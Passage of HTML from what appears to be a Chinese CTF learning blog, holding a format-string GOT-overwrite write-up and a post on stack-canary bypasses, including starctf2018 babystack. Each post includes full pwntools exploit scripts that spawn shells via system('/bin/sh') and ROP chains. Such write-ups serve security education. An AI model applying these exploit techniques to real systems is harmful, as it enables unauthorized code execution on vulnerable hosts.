-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-08 21:40:56" itemprop="dateModified" datetime="2021-12-08T21:40:56+08:00">2021-12-08</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="格式化字符串-1"><a href="#格式化字符串-1" class="headerlink" title="格式化字符串-1"></a>格式化字符串-1</h2><p>这篇文章可能有一些表述存在问题。</p>
-<p>一道格式化字符串题目，程序主逻辑如下：</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/main.png" class>
-
-<p>可以看到此题不存在栈溢出，因为可利用read函数读入的字节小于 s[] 和 format[] 离ebp的距离，另外，对于此题的main函数，即便存在栈溢出显然也无法利用，因为main函数通过调用exit()来进行程序的结束而非return，既然不存在return那也就无法通过栈溢出来控制程序的执行流。 </p>
-<p>程序保护如下：</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/checksec.png" class>
-
-<p>因为RELRO只开了一半，所以got表可写。</p>
-<p>因为strlen()和printf()这两个函数会以 format 为参数，而 format 又可以间接利用read函数进行控制，所以可以先利用格式化字符串漏洞将strlen()或者printf()的got表修改为system函数的真实地址，修改后再调用strlen()或者printf()函数就相当于调用了system()，再利用read函数控制format就相当于控制了system函数的参数，从而执行system(‘/bin/sh’);</p>
-<p>综上此题的思路就明确了：利用格式化字符串漏洞将printf()函数或strlen()函数的got表修改为system函数的地址，修改完成后在下一次循环时利用read函数间接给被修改了got表的函数传参，从而getshell。</p>
-<p>明确了思路之后来思考利用格式化字符串漏洞所需要的东西：①system函数的真实地址。②printf()或strlen()函数的got表的地址。</p>
-<p>显然因为程序开启的保护有限，②可以在IDA中获得。而①就需要手动泄漏。</p>
-<p>①的泄漏方式：</p>
-<p>在gdb中将断点打在有格式化字符串漏洞的printf()函数上（这是为了观察printf()函数的栈空间）</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/%E8%B0%83%E8%AF%95-1.jpg" class>
-
-<p>观察到printf()函数的栈空间如下（输入了 ‘aaaa’ ）</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/stack.png" class>
-
-<p>显然可以看到光标处有一个存在于libc中的函数（__libc_start_main，括号中的 +247 表示 0xf7e1c647（即栈上存放的地址）相对于libc_start_main函数的偏移为 +247 ，所以“0xf7e1c647 - 247”就是libc_start_main函数的真实地址），我们可以选择通过利用格式化字符串漏洞来泄漏它的地址从而获得①。</p>
-<p>既然需要泄漏光标处的地址就需要知道其是相对于格式化字符串的第几个参数，我们运行程序，输入”%p”</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/%E8%B0%83%E8%AF%95-2.jpg" class>
-
-<p>可以看到格式化字符串的第一个参数在 esp+4 上，那么通过计算光标处的地址与 esp+4 的偏移即可得知其是相对于格式化字符串的第151个参数（32位程序一个内存单元占4个字节，0x258 / 4 = 150）</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/%E8%B0%83%E8%AF%95-3.jpg" class>
-
-<p>所以我们输入<code>%151$p</code>就可以泄漏出目标地址，前面说过，该泄漏的地址相对于__libc_strat_main()的偏移为 +247 ，所以要将该地址 -247 才是 libc_start_main()的地址。</p>
-<p>然后通过ret2libc的知识就可以得到system()的地址，此题为：0xf7db5db0。</p>
-<p>到这里我们就可以进行函数got表的修改操作，这里我们选择修改strlen()函数的got表。</p>
-<p>修改got表的操作有几个值得注意的问题：</p>
-<ol>
-<li>显然对于此题而言，必须在一次格式化字符串漏洞的利用中将整个got表修改完成，如果一次只修改部分的话，在下次调用strlen()的时候因为got表被破坏了（没有修改完成），所以会导致程序无法正常执行。</li>
-<li>不能利用一次%n将got表的4个字节全部修改，因为如果利用一次%n修改全部4个字节的话，则需要先在前面输出 ’0xf7db5db0‘ 这么多个字符，这样会导致终端崩溃，所以我们一次性最多修改两个字节，即%hn</li>
-<li>因为%n的特性，我们只能先从较小的两个字节开始修改（因为输出总是越来越多，所以%n写入的数字只能越来越大），于此题而言，我们则需要先将strlen()的got表的低位两字节修改为 ’5db0‘,然后再将高位两字节修改为 ’f7db‘。为此，我们需要将<code>elf.got[&#39;strlen&#39;]</code>以及<code>elf.got[&#39;strlen&#39;] + 2</code>作为格式化字符串的参数（为什么是<code>elf.got[&#39;strlen&#39;] + 2</code>？因为<code>elf.got[&#39;strlen&#39;] + 2</code>的低位两字节就是<code>elf.got[&#39;strlen&#39;]</code>的高位两字节）</li>
-</ol>
-<p>既然我们需要利用 %hn 来进行修改，那么就先需要利用 %c 输出对应的字符数，我们就需要分别取出system()的低位两字节和高位两字节的值作为输出的字符数，显然可以通过位运算的知识来实现，利用 <code>system_addr &amp; 0xffff</code>来取出system()地址的低位两字节，利用<code>(system_addr &gt;&gt; 16) &amp; 0xffff</code>来取出system()地址的高位两字节。</p>
-<p>同时需要注意的是，在两次修改过程中，因为第一次已经打印了<code>system_addr &amp; 0xffff</code> 这么多个字符，所以第二次需要打印的字符数为 <code>((system_addr &gt;&gt; 16) &amp; 0xffff) - (system_addr &amp; 0xffff)</code>，同时注意运算符的优先级。</p>
-<p>对于此题而言，还需要做一些小修改，这是因为我们的输入是s，而printf()的参数是format，在程序的sprintf()中，我们的输入s被进行了拼接的操作</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/%E8%B0%83%E8%AF%95-4.jpg" class>
-
-<p>所以我们在计算需要输出的字符数时还要考虑这个影响，所以第一次输出的字符数应为：</p>
-<p><code>(system_addr &amp; 0xffff) - 9</code></p>
-<p>第二次需要输出的字符数为：<code>((system_addr &gt;&gt; 16) &amp; 0xffff) - (system_addr &amp; 0xffff)</code></p>
-<p>到此处，我们尝试发送我们的payload，发现栈上的数据结构如下：</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/%E8%B0%83%E8%AF%95-5.jpg" class>
-
-<p>显然因为4个字节对齐的缘故，我们输入的地址在栈上被拆散了，所以我们需要对前面的数据进行补齐，使我们发送的两个地址恰好分别在一个内存单元中（找补齐数的方法还不是很懂，迟点回来补），补齐后栈空间如下：</p>
-<img src="/2021/11/18/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-1/%E8%B0%83%E8%AF%95-6.jpg" class>
-
-<p>此时就可以确定我们输入的地址是相对于格式化字符串的第几个参数，这里可数出来是第15、16个。</p>
-<p>到这里为止我们就确定了修改got表的payload。</p>
-<p>最后我们需要利用read()来间接给system()传递参数，同样这里因为我们的输入被进行了拼接，所以我们不能直接输入”/bin/sh\x00”，这里就需要利用linux的拼接命令的符号 “ ；”，分号会使系统执行完分号前面的命令后再执行分号后面的命令，这样就能使得”/bin/sh\x00”被作为一个单独的命令执行。</p>
-<p>综上，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./axbfmt&quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x804870D&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%151$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;me:&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x22769</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./axbfmt&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">lsm = libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_addr = addr + offset</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((system_addr &amp; <span class="number">0xffff</span>) -<span class="number">9</span>)+<span class="string">&#x27;c%15$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (system_addr &amp; <span class="number">0xffff</span>)) + <span class="string">&#x27;c%16$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x21</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>])</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>] + <span class="number">2</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;me:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;me:&quot;</span>,<span class="string">&quot;;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/08/Canary%E7%BB%95%E8%BF%87/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/08/Canary%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">Canary绕过</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-08 19:37:28" itemprop="dateCreated datePublished" datetime="2021-11-08T19:37:28+08:00">2021-11-08</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-25 17:15:22" itemprop="dateModified" datetime="2022-01-25T17:15:22+08:00">2022-01-25</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="①劫持-stack-chk-fail函数实现Canary绕过"><a href="#①劫持-stack-chk-fail函数实现Canary绕过" class="headerlink" title="①劫持__stack_chk_fail函数实现Canary绕过"></a>①劫持__stack_chk_fail函数实现Canary绕过</h2><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>原理是触发Canary后调用来使程序退出的 stack_chk_fail()函数本身也是位于glibc中的函数，默认情况下经过ELF的延迟绑定机制，如果程序的got表具有可写权限的话，就可以通过修改其在got表中的内容实现更改跳转。假如将其got表的内容改为”ret”指令所在的地址的话，那触发 stack_chk_fail()函数就相当于没有跳转。</p>
-<p>值得注意的是，Canary的检查的时间点是在函数返回的时候进行的，所以只有当函数即将返回时Canary才会起到作用。</p>
-<h4 id="一道例题"><a href="#一道例题" class="headerlink" title="一道例题"></a>一道例题</h4><p>先检查程序保护</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/checksec.jpg" class>
-
-<p>可以看到程序开启了Canary保护，但是RELRO保护只开了部分，说明got表此时可写（这句话好像不一定对，学到后面再来确认）。</p>
-<p>main函数如下</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/main.jpg" class>
-
-<p>接下来分析每个函数的作用，跟进到sub_4007C7()函数中</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/ret.png" class>
-
-<p>read函数每次读取一个字节给buf（注意不是v3，赋给v3的值是read函数的返回值，read函数返回其成功读取的字节的个数，该题在正常情况下v3 == 1），可以理解sub_4007C7()函数的作用就是将读取的字符存放到字符数组nptr中，最多读取10个字符，过程中读取到回车时就直接返回。且其通过atoi()函数将字符数组nptr中的字符转换为数字返回。</p>
-<p>跟进到sub_40086C()函数中</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/rewrite.png" class>
-
-<p>可以看到这里通过sub_4007C7()函数修改v0的值就可以实现任意地址写，所以可以通过这个函数来更改__stack_chk_fail()函数的got表的内容。</p>
-<p>跟进到sub_4008BB()函数中</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/overflow.png" class>
-
-<p>这里通过sub_4007C7()函数修改nbytes的值就可以实现往a1的地址中输入几乎任意长度的数据，且传进该函数的参数v5是一个main()函数中char类型的数组，所以能通过sub_4008BB()函数实现main()函数的栈溢出。</p>
-<p>分析完函数作用后分别给其改名以便观看。</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/main-1.png" class>
-
-<p>再结合main()函数中的主逻辑来分析，当v4 == 0的时候实现进入rewrite()函数，当v4 == 1的时候进入overflow()函数，当v4 == “其他数字” 的时候main函数退出循环进行返回。</p>
-<p>综上，exp如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = process(&quot;./pwn1&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn1&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">ret_addr = 0x4005d9</span><br><span class="line">scf_got = elf.got[&#x27;__stack_chk_fail&#x27;]</span><br><span class="line">puts_plt = elf.symbols[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">pop_rdi = 0x400a03</span><br><span class="line">main_addr = 0x40090B</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;choice\n&quot;,&quot;0&quot;)</span><br><span class="line">p.sendlineafter(&quot;address:\n&quot;,str(scf_got))</span><br><span class="line">p.sendafter(&quot;content:\n&quot;,p64(ret_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;choice\n&quot;,&quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;size:\n&quot;,&quot;600&quot;)</span><br><span class="line">payload1 = &quot;a&quot;*0x118 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(&quot;content:\n&quot;,payload1)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;choice\n&quot;,&quot;2&quot;)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;choice\n&quot;,&quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;size:\n&quot;,&quot;600&quot;)</span><br><span class="line"></span><br><span class="line">puts_libc = libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">system_addr = puts_addr - puts_libc + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh = puts_addr - puts_libc + next(libc.search(&#x27;/bin/sh&#x27;))</span><br><span class="line">payload2 = &quot;a&quot;*0x118 + p64(pop_rdi) + p64(binsh) + p64(system_addr)</span><br><span class="line">p.sendlineafter(&quot;content:\n&quot;,payload2)</span><br><span class="line">p.sendlineafter(&quot;choice\n&quot;,&quot;2&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>刚开始做这道题的时候没有想到Canary的检查是在函数返回的时候才进行，就导致了一些错误。</p>
-<p>这也就是为什么在发送了”2”之后才进行puts_addr的接收，因为输入”2”之后按main()函数的逻辑就会进行main()函数的返回，但是由于之前已经修改了__stack_chk_fail()函数的got表中的内容，所以可以正常劫持程序的执行流进行getshell。</p>
-<p>还有一个关于read()函数引起的小细节，read()函数只会读入其第三个参数所指定的大小的字节，这其中包括’\n’，可以看到在rewrite()函数中的read()只读取八个字节，而通过p64打包发送的”ret_addr”的长度正好为8字节，所以exp的第18行需要用send而不能用sendline，使用sendline会使一个’\n’符被下一个输入函数读取从而使程序实际运行与想象中存在偏差。</p>
-<h2 id="②格式化字符串泄漏Canary"><a href="#②格式化字符串泄漏Canary" class="headerlink" title="②格式化字符串泄漏Canary"></a>②格式化字符串泄漏Canary</h2><p>当程序中存在栈上的格式化字符串漏洞时，可以利用其将同样存在于栈上的Canary泄漏出来。</p>
-<h2 id="③覆盖Canary的’-x00’从而打印出Canary"><a href="#③覆盖Canary的’-x00’从而打印出Canary" class="headerlink" title="③覆盖Canary的’\x00’从而打印出Canary"></a>③覆盖Canary的’\x00’从而打印出Canary</h2><p>Canary的最低一字节被设置为’\x00’，原意是防止其被输出函数连带打印出来，那么如果能够将这个’\x00’字节覆盖掉的话，就能利用输出函数连带打印出Canary。</p>
-<h4 id="一道例题-1"><a href="#一道例题-1" class="headerlink" title="一道例题"></a>一道例题</h4><p>程序主逻辑如下：</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/main-2.png" class>
-
-<p>显然在两个 read() 处都存在溢出，而且 printf() 会将buf以字符串的形式输出，那么我们只需要利用第一个 read() 函数来覆盖掉Canary的最低字节的’\x00’，printf() 就会将Canary剩下的内容打印出来。</p>
-<p>我们在IDA中观察函数栈空间：</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/stack.jpg" class>
-
-<p>buf 到 Canary 的距离为 <code>0x20 - 0x8 = 0x18</code> 个字节，加上要覆盖的一个字节共 0x19 个字节。所以我们可以构造如下payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(&quot;warm up!!!&quot;,&#x27;a&#x27;*0x18)</span><br><span class="line">p.recvuntil(&quot;a&quot;*0x18 + &#x27;\n&#x27;)</span><br><span class="line">canary = u64(p.recv(7).rjust(8,&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>
-
-<p>注意这里只发送 0x18 个 “a” 是因为还有 ‘\n’ 占了一个字节。</p>
-<h2 id="④修改TSL中的Canary值实现绕过Canary"><a href="#④修改TSL中的Canary值实现绕过Canary" class="headerlink" title="④修改TSL中的Canary值实现绕过Canary"></a>④修改TSL中的Canary值实现绕过Canary</h2><p>以下知识点从<a target="_blank" rel="noopener" href="https://eternalsakura13.com/2018/04/24/starctf_babystack/">Sakura 师傅的博客</a>中归纳整理</p>
-<h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时，在Linux下会使用TLS（Thread Local Storage、线程局部存储）机制，其会为每一个使用该全局变量的线程都提供一个变量值的副本。</p>
-<p>在glibc的实现中，TLS被指向一个segment register fs(x86-64上)，它的结构tcbhead_t定义如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
-
-<p>其中 <code>stack_guard</code> 就与Canary的设置有关：当一个函数被调用时，Canary就从 <code>tcbhead_t.stack_guard</code> 被放到栈上。当函数调用结束的时候，<strong>栈上的Canary值就会被拿来和 <code>tcbhead_t.stack_guard</code> 进行比较</strong>，如果不相等，程序就会调用 <code>___stack_chk_fail</code> 函数来进行报错行为及程序的终止。在程序中的实现如下：</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-push_canary.png" class>
-
-
-
-<p>可以看到，在函数开辟其栈帧后，程序从 <code>fs:28h</code> 处取得值并将该值放在 <code>rbp+8</code> 处，这个就是函数设置Canary的过程。在函数即将返回的时候，<code>rbp+8</code> 处的值被拿来和 <code>fs:28h</code> 进行比较，如果不相等则调用 <code>___stack_chk_fail</code> 函数。</p>
-<p>由此我们可知 fs 段寄存器或者 gs 段寄存器储存的就是结构体 <code>tcbhead_t</code> 的地址，其偏移28处就是<code>tcbhead_t.stack_guard</code>的地址</p>
-<p>① 研究表明，glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。</p>
-<p>② <strong>在为栈分配内存后，glibc在内存的高地址初始化TLS</strong>，在x86-64架构上，<strong>栈向下增长，将TLS放在栈顶部</strong>。</p>
-<p>③ 从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。</p>
-<p>④ 从TLS到pthread_create的函数参数传递栈帧的距离小于一页。</p>
-<p>那么由此就可以想到，如果我们能够直接对 <code>tcbhead_t.stack_guard</code> 进行修改，那么我们不需要leak出Canary的值也可以绕过Canary保护，比如利用任意地址写，同时因为TLS在栈的上方，所以如果我们溢出的数据足够大，也可以将 <code>tcbhead_t.stack_guard</code> 覆盖掉。</p>
-<h4 id="starctf2018-babystack"><a href="#starctf2018-babystack" class="headerlink" title="starctf2018 babystack"></a>starctf2018 babystack</h4><p>例行检查保护</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-checksec.png" class>
-
-<p>main()函数如下</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-main.jpg" class>
-
-<p>程序利用 <code>pthread_create</code>  创建线程并将 <code>start_routine</code> 作为函数参数，跟进到 <code>start_routine</code> 函数</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-start_routine.jpg" class>
-
-<p>其中<code> v1</code> 在 <code>sub_400906()</code> 中利用 <code>fget()</code> 输入，<code>sub_400957()</code> 函数实现类似 <code>fget()</code> 函数的功能</p>
-<p>所以程序本身就允许我们输入最多 0x10000 个字节的数据，远大于 s[] 到 rbp 的距离，所以我们可以利用栈溢出将tcbhead_t.stack_guard覆写掉。</p>
-<p>接下来寻找我们的输入与 <code>tcbhead_t.stack_guard</code> 的偏移，本题在汇编处可以看到 <code>tcbhead_t.stack_guard</code> 的地址在 fs 寄存器中</p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-push_canary.png" class>
-
-<p>在gdb中可以使用 <code>fsbase</code> 指令来查看 fs 寄存器中的内容，由此得到 <code>tcbhead_t</code> 的地址 </p>
-<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-%E5%88%86%E6%9E%90-1.jpg" class>
-
-<p>由此可知我们的输入与 <code>tcbhead_t.stack_guard</code> 的偏移为 <code>0x1820 + 0x28</code> 个字节，加上8个用来覆盖的字节我们共需要输入 <code>0x1820 + 0x28 + 0x8 = 0x1850</code> 个字节的数据。</p>
-<p>到此我们明确了绕过Canary的操作，接下来还需要leak出libc的地址来getshell，泄漏步骤很常规就不赘述了。这题原本我想完成泄漏后再次触发栈溢出来getshell，但是发现程序返回到再次触发栈溢出之前就崩溃了，暂时还不太理解为什么。但是因为程序本身有调用 <code>read()</code> 函数，所以我们可以在一条payload中先完成泄漏的工作，然后利用 <code>read()</code> 将ROP写入 <code>.bss</code> 段中，最后将栈迁移到 <code>.bss</code> 段中完成 ROP 。</p>
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28143</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bs&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/giantbranch/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400c03</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">bss = <span class="number">0x0602010</span></span><br><span class="line">leave_ret = <span class="number">0x0400B90</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;to send?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1850</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x1010</span> + p64(bss+<span class="number">0x300</span>) + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15)</span><br><span class="line">payload += p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1850</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;It&#x27;s time to say goodbye.\n&quot;</span>)</span><br><span class="line">lsm = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(lsm)</span><br><span class="line"></span><br><span 